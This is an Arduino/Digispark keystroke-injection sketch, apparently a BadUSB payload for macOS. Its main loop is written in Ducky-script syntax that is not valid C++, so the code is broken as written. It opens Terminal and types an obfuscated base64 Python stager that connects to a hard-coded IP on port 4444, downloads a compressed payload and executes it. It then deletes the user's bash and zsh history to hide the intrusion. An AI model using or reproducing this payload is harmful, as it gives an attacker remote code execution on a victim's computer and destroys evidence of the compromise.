#include	"DigiKeyboard.h"

void setup()	{
	//LEAVE EMPTY
}

void loop()	{
	DELAY 700
	GUI SPACE
	DELAY 100
	STRING Terminal
	DELAY 200
	ENTER
	DELAY 200
	STRING python -c "$(printf '%s' 'aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5OC41OC4xMDYuMjEwJyw0NDQ0KSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK' | base64 -D)"
	ENTER
	DELAY 700
	GUI q
	DELAY 100
	GUI SPACE
	DELAY 100
	STRING Terminal
	DELAY 200
	ENTER
	DELAY 100
	STRING rm ~/.bash_history ~/.zsh_history
	ENTER
	DELAY 100
	GUI q
}